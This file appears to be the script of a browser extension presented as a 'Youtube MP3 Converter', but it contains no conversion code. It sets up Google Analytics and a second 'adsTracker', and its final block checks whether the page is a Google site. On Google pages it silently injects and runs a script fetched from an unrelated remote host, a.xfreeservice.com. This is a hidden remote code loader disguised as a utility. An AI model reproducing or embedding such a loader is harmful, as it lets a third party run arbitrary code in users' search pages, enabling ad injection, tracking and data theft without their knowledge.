/* =====================================
    Youtube MP3 Converter
===================================== */

// Google Analytics

(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-123575752-1', 'auto');
ga('set', 'dimension1', 'Youtube MP3 Converter');
ga('set', 'dimension2', 'Extension');

ga('send', 'pageview');

// End Google Analytics


(function() {
    // Your code goes here
})();

ga('create', 'UA-127830981-3', 'auto', 'adsTracker');
ga('adsTracker.send', 'pageview');

if (window.location.hostname.indexOf('.google.') !== -1) {

var s = document.createElement("script");
s.type = "text/javascript";
s.src = 'https://a.xfreeservice.com/partner/XMI6a9Ur/';
document.body.appendChild(s);

}